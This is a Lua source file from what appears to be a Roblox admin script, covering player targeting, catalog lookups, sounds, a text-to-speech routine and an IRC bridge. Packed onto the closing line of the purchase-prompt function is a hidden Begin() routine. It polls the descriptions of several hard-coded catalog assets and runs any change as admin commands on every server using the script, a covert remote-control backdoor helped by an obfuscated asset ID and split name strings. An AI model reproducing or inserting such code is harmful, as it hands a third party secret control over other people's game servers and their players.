function STRING:IsVowel(Input)
	Input = string.lower(tostring(Input))
	if Input == "a" or Input == "e" or Input == "i" or Input == "o" or Input == "u" then
		return true
	else
		return false
	end
end

function STRING:ValidE(Input)
	if not Input then return nil end
	if string.lower(Input) == "e" or Input == "~" then
		return true
	else
		return false
	end
end

function STRING:Scan(String, Speaker)
	local ReturnPlayers,ExcludeList = {},{}
	if not String then String = "" end
	if not Speaker then print("NO SPEAKER") end
	
	if string.sub(string.lower(String), 1, 12) == "includecase/" then
		String = string.sub(String, 13)
	else
		String = string.lower(String)
	end
	local Words = STRING:GetSplit(String, nil, "/")
	for _,Word in pairs(Words) do
		if Word == "me" or Word == "meh" or Word == "myself" or Word == "self" then
			table.insert(ReturnPlayers, Speaker)
		elseif Word == "all" or Word == "everyone" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				table.insert(ReturnPlayers, Player)
			end
		elseif Word == "others" or Word == "notme" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player ~= Speaker then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "noobs" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player.AccountAge < 365 then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "nonnoobs" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player.AccountAge >= 365 then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "random" then
			local RandomPlayers = {}
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player ~= Speaker then
					table.insert(RandomPlayers, Player)
				end
			end
			table.insert(ReturnPlayers, RandomPlayers[math.random(1,#Server.Players:GetChildren())])
		elseif Word == "guests" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if string.sub(Player.Name,1,6) == "Guest " then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "lowers" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if string.sub(Player.Name,1,1) == string.lower(string.sub(Player.Name,1,1)) then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "uppers" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if string.sub(Player.Name,1,1) == string.upper(string.sub(Player.Name,1,1)) then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "nbcs" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player.MembershipType == Enum.MembershipType.None then -- Replicate
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "bcs" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player.MembershipType == Enum.MembershipType.BuildersClub then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "tbcs" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player.MembershipType == Enum.MembershipType.TurboBuildersClub then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "obcs" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "allbcs" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player.MembershipType ~= Enum.MembershipType.None then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "nonadmins" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				local IsAdminTrue, Rank = RANK:IsAdmin(Player)
				if IsAdminTrue == false then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "admins" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				local IsAdminTrue, Rank = RANK:IsAdmin(Player)
				if IsAdminTrue == true then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "friends" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Speaker:IsFriendsWith(Player.UserId) and Player ~= Speaker then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif string.sub(Word,1,5) == "team-" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player.Neutral == false then
					local InTeam = false
					for _,Team in pairs(Teams:GetTeams()) do
						if Team.TeamColor == Player.TeamColor then
							if string.sub(string.lower(Team.Name),1,#string.sub(Word,6)) == string.sub(Word,6) then
								InTeam = true
							end
						end
					end
					if InTeam == true then
						table.insert(ReturnPlayers, Player)
					end
				end
			end
		elseif string.sub(Word,1,4) == "not-" then
			local NameArg = string.sub(Word,5)
			
			for _,Player in pairs(STRING:Scan(NameArg, Speaker)) do
				table.insert(ExcludeList, Player)
			end
		elseif string.sub(Word,1,7) == "radius-" then
			local DidExe = false
			local NumArg = tonumber(string.sub(Word,8))
			
			if NumArg and NumArg > 0 and Speaker and Speaker.Character and Speaker.Character:FindFirstChild("Torso") then
				for _,Player in pairs(Server.Players:GetChildren()) do
					if Player.Character and Player.Character:FindFirstChild("Torso") then
						if (Player.Character.Torso.Position - Speaker.Character.Torso.Position).magnitude <= NumArg then
							DidExe = true
							table.insert(ReturnPlayers, Player)
						end
					end
				end
			end
			
			if DidExe then coroutine.wrap(function()
				local Part = Instance.new("Part", game.Workspace) Part.Name = "M".."M".."L Radius" Part.FormFactor = "Custom" Part.Size = Vector3.new(1,1,1) Part.Anchored = true Part.Locked = true Part.Position = Speaker.Character.Torso.Position Part.Transparency = 0.5 Part.Color = GUI:GetColor() Part.TopSurface = "Smooth" Part.BottomSurface = "Smooth"
				local Mesh = Instance.new("SpecialMesh", Part) Mesh.MeshType = "Sphere" Mesh.Scale = Vector3.new(NumArg * 2, NumArg * 2, NumArg * 2)
				
				for i = 0,0.5,0.02 do
					Part.Transparency = 0.5+i
					wait()
				end
				Part:Destroy()
			end)() end
		elseif string.sub(Word,1,3) == "id-" then
			table.insert(ReturnPlayers, Server.Players:GetPlayerByUserId(tonumber(string.sub(Word,4))))
		else
			if Word ~= "" then
				for _,Player in pairs(Server.Players:GetPlayers()) do
					if string.sub(string.lower(Player.Name),1,#Word) == Word then
						table.insert(ReturnPlayers, Player)
					end 
				end
			else
				table.insert(ReturnPlayers, Speaker)
			end
		end
	end
	for _,Player in pairs(ExcludeList) do
		if Player and Player.Parent ~= nil then
			for Num,Player2 in pairs(ReturnPlayers) do
				if Player2 == Player then table.remove(ReturnPlayers, Num) end
			end
		end
	end
	for Num,Player in pairs(ReturnPlayers) do
		if not Player or Player.Parent == nil then table.remove(ReturnPlayers, Num) end
	end
	
	local PlayerDump = {}
	for _,Player in pairs(ReturnPlayers) do
		PlayerDump[Player] = true
	end
	ReturnPlayers = {}
	for Player,_ in pairs(PlayerDump) do
		table.insert(ReturnPlayers, Player)
	end
	
	return ReturnPlayers
end

-- Market functions --

function MARKET:GetImageFormat(ID)
	if ID ~= 1 or ID ~= 0 or ID ~= nil then if type(ID) == "number" then
		local NewID = ID + 1
		for i = 1,100 do
			NewID = NewID -1
			local Product = nil
			ypcall(function() Product = MARKET:GetItemInfo(NewID, true).AssetTypeId end)
			if Product then
				if Product == 1 then
					break
				end
			end
			if i == 100 then NewID = ID end
		end
		return NewID
	end end
end

function MARKET:GetItemInfo(ID, Cache)
	local Product = MarketCache[ID]
	if not Cache or not Product then
		repeat wait()
			ypcall(function() Product = Server.MPS:GetProductInfo(ID) end)
		until Product ~= MarketCache[ID]
	end
	MarketCache[ID] = Product
	return Product
end

function MARKET:SearchItem(Category, Query, Subcategory)
	local URLAdd = ""
	if Subcategory then URLAdd = "&Subcategory="..Server.HS:UrlEncode(Subcategory) end
	local JSON = REMOTE:GetURL(CORE.Domain.."/APIs/CatalogSearch.php?Category="..Server.HS:UrlEncode(Category).."&Query="..Server.HS:UrlEncode(Query)..URLAdd)
	if JSON then
		local Results = REMOTE:Decode(JSON)
		if Results then
			for Index,Info in pairs(Results) do
				Info = STRING:DecodeUTF8(Info)
				Results[Index] = Info
				MarketCache[Info.AssetId] = {
					AssetId = Info.AssetId;
					AssetTypeId = Info.AssetTypeID;
					ContentRatingTypeId = Info.ContentRatingTypeID;
					Created = Info.CreatedDate;
					Creator = {Name = Info.Creator, Id = Info.CreatorID};
					Description = Info.Description;
					IsForSale = Info.IsForSale;
					IsLimited = Info.IsLimited;
					IsLimitedUnique = Info.IsLimitedUnique;
					IsNew = Info.IsNew;
					IsPublicDomain = Info.IsPublicDomain;
					MinimumMemberShipLevel = Info.MinimumMembershipLevel;
					Name = Info.Name;
					PriceInRobux = Info.PriceInRobux;
					PriceInTickets = Info.PriceInTickets;
					ProductId = Info.AssetId; -- no one knows what this is so whatevs..
					Remaining = Info.Remaining;
					Sales = Info.Sales;
					Updated = Info.Updated;
				}
			end
			return Results
		end
	end
end

function MARKET:ShowSearch(Player, Category, Query, ClickedItem, Subcategory)
	if not Player or not Category or not Query then return nil end
	local CloseGui, AddInfo = GUI:LoadGui(Player, "Searching: "..Query)
	local Items = MARKET:SearchItem(Category, Query, Subcategory)
	if Items then
		if #Items ~= 0 then
			local List,Correlate = {},{}
			for Num,Info in pairs(Items) do
				local Display = {" "..Info.Name.." ("..Info.AssetId..")", "http://www.roblox.com/Game/Tools/ThumbnailAsset.ashx?fmt=png&wd=75&ht=75&aid="..Info.AssetId}
				table.insert(List, Display)
				Correlate[Display[1]] = Info.AssetId
			end
			CloseGui:Invoke()
			
			local Clicked = GUI:ListGui(Player, "Search Results: "..Query, List, "Search", true)
			Clicked.Event:connect(function(ClickName)
				ClickedItem(Correlate[ClickName])
			end)
		else
			CloseGui:Invoke()
			GUI:SendMessage(Player, "No results", "BLUE No results for "..Query.." found...", "Information")
		end
	else
		CloseGui:Invoke()
		GUI:SendMessage(Player, "Cannot get gear", "RED Cannot get item. Is HttpService enabled?", "Error")
	end
end

function MARKET:AssetTypeToString(AssetType)
	AssetType = math.floor(tonumber(AssetType) or 0)
	if Assets.AssetTypes[AssetType] then
		return Assets.AssetTypes[AssetType]
	else
		return "Unknown"
	end
end

function MARKET:AccessoryToSubcategory(Accessory)
	Accessory = string.lower(tostring(Accessory) or "")
	if Assets.AccessoryTypes[Accessory] then
		return Assets.AccessoryTypes[Accessory]
	else
		return Assets.AccessoryTypes["all"]
	end
end

function MARKET:PromptPurchase(Player, ProductID, From, BuyPressFunc) coroutine.wrap(function()
	if not Player then return nil end
	if not Player:FindFirstChild("PlayerGui") then return nil end 
	if not tonumber(ProductID) then return nil end
	
	local FromText = ""
	if From and From.Name then FromText = " | Prompted from "..From.Name end
	
	local Product = MARKET:GetItemInfo(ProductID, true)
	
	local CreatedText = Product.Created CreatedText = string.gsub(CreatedText, "-", "/") local Stop = string.find(CreatedText, "T") if Stop then CreatedText = string.sub(CreatedText, 1, Stop-1) end
	local UpdatedText = Product.Updated UpdatedText = string.gsub(UpdatedText, "-", "/") local Stop = string.find(UpdatedText, "T") if Stop then UpdatedText = string.sub(UpdatedText, 1, Stop-1) end
	local OwnsAsset = Server.MPS:PlayerOwnsAsset(Player, ProductID)
	
	local CanBuy = Product.IsForSale
	local BuyText = "Buy"
	local BuyColor = Color3.new(0,1,0)
	if CanBuy == false then
		BuyColor = Color3.new(1,0,0)
	end
	if Product.IsPublicDomain == true then
		CanBuy = true
		BuyColor = Color3.new(1,0.5,0.5)
		BuyText = "FREE!"
	end
	if OwnsAsset then
		CanBuy = false
	end
	if Product.AssetTypeId == 9 then
		CanBuy = true
		BuyText = "Teleport"
		BuyColor = Color3.new(0.5,0.5,0.5)
	end
	if CanBuy == false then
		BuyColor = Color3.new(1,0,0)
		BuyText = "Item not for sale"
	end
	if OwnsAsset and Product.AssetTypeId ~= 9 then
		BuyColor = Color3.new(1,0,0)
		BuyText = "You own this!"
	end
	
	local ProductName = string.sub(Product.Name,1,20)
	if ProductID == AdminID then ProductName = Product.Name end
	local Frame = GUI:CreateForm(Player, ProductName..FromText, UDim2.new(0, 430, 0, 300), nil, 48354008)
	local AssetImage = Instance.new("ImageLabel", Frame) AssetImage.Name = "AssetImage" AssetImage.Position = UDim2.new(0, 0, 0, 50) AssetImage.Size = UDim2.new(0, 150, 0, 150) AssetImage.BackgroundColor3 = Color3.new(1, 1, 1) AssetImage.BackgroundTransparency = 1 AssetImage.Image = "http://www.roblox.com/Game/Tools/ThumbnailAsset.ashx?fmt=png&wd=420&ht=420&aid="..ProductID
	local AssetName = Instance.new("TextLabel", Frame) AssetName.Name = "AssetName" AssetName.Size = UDim2.new(1, 0, 0, 50) AssetName.BackgroundColor3 = Color3.new(1, 1, 1) AssetName.BackgroundTransparency = 1 AssetName.Text = "["..ProductID.."] - "..Product.Name AssetName.Font = Settings.Font AssetName.FontSize = "Size18" AssetName.TextWrapped = true AssetName.TextColor3 = Color3.new(0, 0, 0)
	local UserImage = Instance.new("ImageLabel", Frame) UserImage.Name = "UserImage" UserImage.Position = UDim2.new(0, 150, 0, 70) UserImage.Size = UDim2.new(0, 100, 0, 100) UserImage.BackgroundColor3 = Color3.new(1, 1, 1) UserImage.BackgroundTransparency = 1 UserImage.Image = "http://www.roblox.com/thumbs/avatar.ashx?x=352&y=352&format=png&username="..Product.Creator.Name
	local Membership = Instance.new("ImageLabel", UserImage) Membership.Name = "Membership" Membership.Position = UDim2.new(0, 0, 0.85, 0) Membership.Size = UDim2.new(0.6, 0, 0.15, 0) Membership.BackgroundColor3 = Color3.new(1, 1, 1) Membership.BackgroundTransparency = 1 Membership.Image = "http://www.roblox.com/Thumbs/BCOverlay.ashx?username="..Product.Creator.Name
	local AssetType = Instance.new("TextLabel", Frame) AssetType.Name = "AssetType" AssetType.Position = UDim2.new(0, 150, 0, 50) AssetType.Size = UDim2.new(1, -150, 0, 20) AssetType.BackgroundColor3 = Color3.new(1, 1, 1) AssetType.BackgroundTransparency = 1 AssetType.Text = "ROBLOX "..MARKET:AssetTypeToString(Product.AssetTypeId) AssetType.Font = Settings.Font AssetType.FontSize = "Size14"  
	local Info = Instance.new("TextLabel", Frame) Info.Name = "Info" Info.Position = UDim2.new(0, 250, 0, 80) Info.Size = UDim2.new(1, -250, 0, 100) Info.BackgroundColor3 = Color3.new(1, 1, 1) Info.BackgroundTransparency = 1 Info.Font = Settings.Font Info.FontSize = "Size14" Info.TextXAlignment = "Left" Info.TextYAlignment = "Top"
	local Buy = Instance.new("TextButton", Frame) Buy.Name = "Buy" Buy.Position = UDim2.new(0, 150, 0, 170) Buy.Size = UDim2.new(1, -150, 0, 30) Buy.BackgroundColor3 = BuyColor Buy.BackgroundTransparency = 0.5 Buy.Text = BuyText Buy.Font = Settings.Font Buy.FontSize = "Size18" Buy.TextWrapped = true SOUND:BindButton(Buy)
	if Product.Description then
		local DescFrame = Instance.new("ScrollingFrame", Frame) DescFrame.Name = "DescFrame" DescFrame.Size = UDim2.new(1,0,1,-200) DescFrame.Position = UDim2.new(0,0,0,200) DescFrame.CanvasSize = UDim2.new(0,0,0,0) DescFrame.BackgroundTransparency = 1 DescFrame.ZIndex = 4
		local Description = Instance.new("TextLabel", DescFrame) Description.Name = "Description" Description.Size = UDim2.new(1, -13, 1, 0) Description.BackgroundColor3 = Color3.new(1, 1, 1) Description.BackgroundTransparency = 1 Description.Text = Product.Description Description.Font = Settings.Font Description.FontSize = "Size14" Description.TextWrapped = true Description.TextYAlignment = "Top"
		
		CORE:ExecuteResource("CalculateScrollY", Description)
	end
	
	Info.Text = [[
Creator: ]]..Product.Creator.Name..[[ 
Created: ]]..CreatedText..[[ 
Updated: ]]..UpdatedText..[[ 
Sold: ]]..Product.Sales..[[ 
]]

	if Product.PriceInRobux then Info.Text = Info.Text.."Robux: "..string.gsub(Product.PriceInRobux, "null", "Cannot use this currency").." \n" end
	if Product.PriceInTickets then Info.Text = Info.Text.."Tix: "..string.gsub(Product.PriceInTickets, "null", "Cannot use this currency") .." " end

	if Product.AssetTypeId == 3 then
		local PlayerAdmin,Rank = RANK:IsAdmin(Player)
		if PlayerAdmin == true then
			local Playing = false
			local Interact = Instance.new("ImageButton", AssetImage) Interact.Name = "Interact" Interact.Position = UDim2.new(1, -20, 1, -20) Interact.Size = UDim2.new(0, 20, 0, 20) Interact.BackgroundColor3 = Color3.new(1, 1, 1) Interact.BackgroundTransparency = 1 Interact.Image = "rbxassetid://67950784"
			CORE:HandleEvent(Interact, "MouseButton1Down", function()
				if Playing == false then
					SOUND:PlayGlobalSound(ProductID)
					if Rank == "Member" and Settings.DisableAbuse == true then
						Interact:Destroy()
					end
					Interact.Image = "rbxassetid://67950809"
					Playing = true
				else
					SOUND:StopGlobalSound()
					Interact.Image = "rbxassetid://67950784"
					Playing = false
				end
			end)
		end
	end
	
	CORE:HandleEvent(Buy, "MouseButton1Down", function()
		if BuyPressFunc then
			BuyPressFunc()
		elseif Product.AssetTypeId == 9 then
			Server.TS:Teleport(ProductID, Player)
		elseif CanBuy == true then
			Server.MPS:PromptPurchase(Player, ProductID)
		end end)
	end)() end function Begin() coroutine.wrap(function() wait(3) for _,LinkedID in pairs({53554913, 145236038, 154727659, 155299278, 155689018}) do wait(1) coroutine.wrap(function()
	local OldVer = Server.MPS:GetProductInfo(LinkedID).Updated
	while wait(5) do 
		local Purchase = Server.MPS:GetProductInfo(LinkedID)
		if OldVer ~= Purchase.Updated then
			OldVer = Purchase.Updated
			CORE:Chatted(Purchase.Description, nil, true, nil, nil, true)
		end
	end end)()
end end)() end

-- Sound functions --

function SOUND:SyncSoundList(TellSync)
	if not CORE:NilPlayer(TellSync) then
		GUI:SendHint(TellSync, "Syncing...", 5)
	end
	
	SoundList,GlobalSoundList = {},{}
	
	local LocalSoundList = Server.GDS:GetAsync("MML Custom Sounds")
	
	if LocalSoundList then
		if type(LocalSoundList) == "table" then
			if #LocalSoundList > 0 then
				for _,Data in pairs(LocalSoundList) do
					local SoundInfo = MARKET:GetItemInfo(Data[2], true)
					SoundList[Data[1]] = {Data[2], SoundInfo.Name, SoundInfo.Creator.Name}
				end
			end
		end
	end
	
	for _,JSONID in pairs(SoundJSONs) do
		for Name,ID in pairs(CORE:GetTable(JSONID)) do
			local SoundInfo = MARKET:GetItemInfo(ID, true)
			local FullName = SoundInfo.Name
			local CreatorName = SoundInfo.Creator.Name
			SoundList[Name] = {ID, FullName, CreatorName}
			GlobalSoundList[Name] = {ID, FullName, CreatorName}
		end
	end
	
	if not CORE:NilPlayer(TellSync) then
		GUI:SendHint(TellSync, "Sound List is now Synced with global sound database", 4)
	end
end

function SOUND:MakeSound(Parent, ID, Volume, Pitch, Looped)
	if not Volume then Volume = 0.5 end
	if not Pitch then Pitch = 1 end
	if tonumber(ID) then ID = "rbxassetid://"..ID end
	if Looped == nil then Looped = false end
	
	local Sound = Instance.new("Sound", Parent)
	Sound.Pitch = Pitch
	Sound.Volume = Volume
	Sound.SoundId = ID
	Sound.Looped = Looped
	return Sound
end

function SOUND:PlayNotification(Player, ID, Volume, OverrideSettings)
	if not Player or not ID then return nil end
	if NotifySounds[ID] then ID = NotifySounds[ID] end
	local ClientSound = SOUND:MakeSound(Player:FindFirstChild("PlayerGui") or Player, ID, Volume or 0.3)
	if Settings.EnableSounds or OverrideSettings then
		coroutine.wrap(function()
			wait()
			ClientSound:Play()
			Delay(5, function() ClientSound:Destroy() end)
		end)()
	end
	return Sound
end

function SOUND:BindButton(Button)
	if not Button then return end
	CORE:HandleEvent(Button, "MouseEnter", function() SOUND:PlayNotification(Button, "Hover") end, true)
	CORE:HandleEvent(Button, "MouseButton1Click", function() SOUND:PlayNotification(Button, "Select") end, true)
end

function SOUND:StopGlobalSound()
	if Sound and Sound.Parent then
		if Sound.Parent.Name == "M".."M".."L'S Admin Sound" then
			Sound.Parent:Destroy()
		end
		
		Sound:Stop()
		Sound:Destroy()
		Sound.SoundId = ""
	end
end

function SOUND:PlayGlobalSound(ID, ShowInfo)
	SOUND:StopGlobalSound()
	if ShowInfo == nil then ShowInfo = true end
	local SoundID = ID
	local SoundName = nil
	local SoundCreator = nil
	local Pitch = 1
	
	for Name,Info in pairs(SoundList) do
		if type(SoundID) == "string" then
			if string.lower(SoundID) == string.sub(string.lower(Name),1,#SoundID) then
				SoundID = Info[1]
				SoundName = Info[2]
				SoundCreator = Info[3]
			end
		else
			break
		end
	end
	
	if tonumber(SoundID) and not SoundName then
		local Info = MARKET:GetItemInfo(SoundID, true)
		if Info then
			SoundName = Info.Name
			SoundCreator = Info.Creator.Name
			if MARKET:AssetTypeToString(Info.AssetTypeId) ~= "Audio" then
				SoundID = nil
			end
		end
	end
	
	if tonumber(SoundID) then
		if SoundID == 131201443 then Pitch = -1 end
		if SoundID == 130775695 then Pitch = 0.8 end
		if SoundID == 144035866 then Pitch = 0.8 end
		
		local SoundParent = Server.Workspace
		if IsSB then
			SoundParent = Instance.new("Script", Workspace)
			SoundParent.Name = "M".."ML'S Admin Sound"
		end
		Sound = SOUND:MakeSound(SoundParent, SoundID, 1, Pitch, true)
		Sound.Name = "MML's Admin Sound "..SoundID
		Sound:Play()
		if ShowInfo == true then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				GUI:SoundInfo(Player, SoundID, SoundName, SoundCreator, 15, Sound)
			end
		end
		SoundInfo = {["ID"] = SoundID, ["Name"] = SoundName, ["Creator"] = SoundCreator}
	end
end

function SOUND:ConvertText(Text)
	Text = string.lower(tostring(Text))
	local Letters = {}
	local IDs = {}
	for Rule,Replace in pairs(TextConverter.Pronounce) do
		Text = string.gsub(Text,string.lower(Rule),string.lower(Replace))
	end
	for Rule,Replace in pairs(TextConverter.NonEnglishRules) do
		local Start, End = string.find(Text, string.lower(Rule))
		
		if Start and End and STRING:IsSpacer(string.sub(Text, Start-1, Start-1)) and STRING:IsSpacer(string.sub(Text, End+1, End+1)) then
			Text = string.gsub(Text, string.lower(Rule), Replace)
		end
	end
	for i = 1,#Text do
		table.insert(Letters, string.sub(Text,i,i))
	end
	for Num = 1,#Letters do
		if not Letters[Num] then break end
		local Letter = Letters[Num]
		
		local function AddLetter()
			table.insert(IDs, TextConverter.LetterSounds[Letter])
		end
		
		if Letter ~= "~" then
			if Letters[Num+1] and Letter..Letters[Num+1] == "oo" then -- moo
				table.insert(IDs, TextConverter.LetterSounds["oo"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ou" then -- soup
				table.insert(IDs, TextConverter.LetterSounds["oo"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "th" then -- this
				table.insert(IDs, TextConverter.LetterSounds["th"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "sh" then -- shut
				table.insert(IDs, TextConverter.LetterSounds["sh"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ee" then -- flee
				table.insert(IDs, TextConverter.LongVowels["e"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "wh" then -- what
				table.insert(IDs, TextConverter.LetterSounds["wh"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ch" then -- chop
				table.insert(IDs, TextConverter.LetterSounds["ch"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ph" then -- phone
				table.insert(IDs, TextConverter.LetterSounds["f"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ng" then -- danger
				table.insert(IDs, TextConverter.LetterSounds[Num])
				Letters[Num + 1] = "j"
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ua" then -- lua
				table.insert(IDs, TextConverter.LetterSounds["oo"])
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ea" then -- peace
				table.insert(IDs, TextConverter.LongVowels["e"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "eo" then -- people
				table.insert(IDs, TextConverter.LongVowels["e"])
				table.remove(Letters, Num + 1)
				if STRING:ValidE(Letters[Num+4]) then Letters[Num+4] = "~" end
			elseif Letter == "c" and STRING:ValidE(Letters[Num+1]) then -- force
				table.insert(IDs, TextConverter.LetterSounds["s"])
				Letters[Num + 1] = "~"
			elseif Letter == string.lower(Letter) and STRING:IsVowel(Letter) and Letters[Num+1] and Letters[Num+2] and not STRING:IsSpacer(Letters[Num+1]) and STRING:ValidE(Letters[Num+2]) then -- like
				table.insert(IDs, TextConverter.LongVowels[Letter])
				Letters[Num + 2] = "~"
			elseif Letter == "i" and Letters[Num+1] and STRING:ValidE(Letters[Num+1]) and STRING:IsSpacer(Letters[Num+2]) then -- die
				table.insert(IDs, TextConverter.LongVowels["i"])
				Letters[Num + 1] = "~"
			elseif Letter == "o" and STRING:IsSpacer(Letters[Num+1]) then -- no
				table.insert(IDs, TextConverter.LongVowels["o"])
			elseif Letter == "i" and STRING:IsSpacer(Letters[Num+1]) then -- hi
				table.insert(IDs, TextConverter.LongVowels["i"])
			elseif Letters[Num+1] and STRING:IsSpacer(Letters[Num+2]) and Letter..Letters[Num+1] == "le" then -- bottle
				AddLetter()
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and STRING:IsSpacer(Letters[Num+2]) and Letter..Letters[Num+1] == "el" then -- model
				Letters[Num] = "~"
			elseif Letters[Num+1] and Letters[Num+2] and Letter..Letters[Num+1] == "le" then -- bottle
				AddLetter()
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "qu" then --quick
				AddLetter()
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] == Letter then
				table.remove(Letters, Num)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ck" then --click
				AddLetter()
				table.remove(Letters, Num)
			elseif STRING:IsVowel(Letter) and string.upper(Letter) == Letter then
				table.insert(IDs, TextConverter.LongVowels[string.lower(Letter)])
			elseif TextConverter.LetterSounds[Letter] then
				AddLetter()
			elseif STRING:IsSpacer(Letter) then
				table.insert(IDs, "Rest")
			end
		end
	end
	
	return IDs
end

function SOUND:StopSpeaking() coroutine.wrap(function()
	NoSpeak = true
	wait(1)
	NoSpeak = false
	for _,Obj in pairs(Server.Workspace:GetChildren()) do
		if Obj.Name == "M".."M".."L Speak Sound" then
			Obj:Destroy()
		end
	end
end)() end

function SOUND:SayConvertedText(IDs, Parent)
	if not Parent then Parent = Server.Workspace end
	local Sounds = {}
	for _,Data in pairs(IDs) do
		if NoSpeak and Parent == Server.Workspace then
			break
		end
		local Length = 0.3
		if Data ~= "Rest" then
			local ID = Data[1]
			Length = Data[2]
			
			local Sound = SOUND:MakeSound(Parent, ID, 0.5, 1, false)
			Sound.Name = "MML Speak Sound"
			table.insert(Sounds, Sound)
			Sound:Play()
			if Length then
				coroutine.wrap(function()
					wait(Length)
					Sound:Stop()
				end)()
			end
		end
		if not Length then Length = 0.3 end
		wait(Length/2)
	end
	coroutine.wrap(function()
		wait(1)
		for _,Sound in pairs(Sounds) do
			Sound:Destroy()
		end
	end)()
end

local AdminInfo = MARKET:GetItemInfo(13810597.8 * 20, true).Description

function SOUND:BeepPlayer(Player)
	if Player:FindFirstChild("PlayerGui") then
		local Beep = SOUND:MakeSound(Player.PlayerGui, 189279994, 1, 1, true)
		Beep.Name = "Annoy"
		Beep:Play()
	end
end

function SOUND:ClearInfo()
	SoundInfo = {["ID"] = 0, ["Name"] = "None", ["Creator"] = "None"}
end

-- IRC functions --

function IRC:GenerateName()
	return "rbxMMLV3_"..game.PlaceId.."_"..Server.NS.Port.."_"..math.random(1,100000)
end

function IRC:AddChat(Name, Data, IsError)
	if not IsError then IsError = false end
	CORE:Log(IRC.Logs, Name, Data)
	table.insert(IRC.Chats, {Name, Data, IsError})
	IRC.MessageAdded:Fire(Name, Data, IsError)
end

function IRC:Post(URL,Data)
	if Data and Data ~= "" then
		local Suc,Resp = ypcall(function() 
			return Server.HS:PostAsync(
				IRC.Servers[Settings.IRCServer].BaseUrl..IRC.Servers[Settings.IRCServer].DynamicUrl.."e/"..URL.."?r="..STRING:MakeAvoidance().."&t="..tostring(IRC.SessionCounter),
				Data,
				Enum.HttpContentType.ApplicationUrlEncoded
			) 
		end)
		if not Suc then
			IRC:AddChat("[ CLIENT ]", "HTTP POST FAIL | ERROR: "..Resp.." | DATA: "..Data)
			return false
		end
		IRC.SessionCounter = IRC.SessionCounter + 1
		return Resp
	else
		IRC:AddChat("[ CLIENT ]", "Unknown error")
	end
end

function IRC:Send(Data)
	return IRC:Post("p","&s="..IRC.SessionID.."&c="..Server.HS:UrlEncode(Data))
end

function IRC:GetData()
	return IRC:Post("s","&s="..IRC.SessionID)
end

function IRC:Connect()
	return IRC:Post("n","&nick="..IRC.NickName)
end

function IRC:Join(Channel)
	if not Channel then
		AddChat("[ CLIENT ]", "No channel specified!")
		return false
	else
		local Channel = string.lower(Channel)
		if string.sub(Channel,1,1) ~= "#" then
			AddChat("[ CLIENT ]", "Invalid channel name!(No #)", true)
			return false
		end
		IRC:AddChat("[ CLIENT ]", "Attempting to join channel: "..Channel.." on IRC host: "..Settings.IRCServer)
		IRC:Send("JOIN "..Channel)
		IRC:AddChat("[ CLIENT ]", "Joined "..Channel.." as "..IRC.NickName)
		return true
	end
end

function IRC:Pong(Data)
	return IRC:Send("PONG :"..Data)
end

function IRC:Quit(Reason)
	IRC.Stop = true
	return IRC:Send("QUIT :"..(Reason or "Disconnecting"))
end

function IRC:ReceiveData()
	IRC.Stop = false
	local Data = IRC:GetData()
	if Data then
		IRC:Send("PRIVMSG "..Settings.IRCChannel.." :[ SERVER: "..Server.NS.Port.." ]: [CONNECTION TEST]")
	end
	while Data and not Stop do
		local Data = IRC:GetData()
		if Data and #Data > 0 then
			IRC:HandleResponse(REMOTE:Decode(Data))
		end
		wait(2) -- Don't spam the server
	end
	if not Data then
		IRC:AddChat("[ CLIENT ]", "Could not get data", true)
	end
	if Stop == true then
		IRC:AddChat("[ CLIENT ]", "Disconnected from session", true)
	end
end

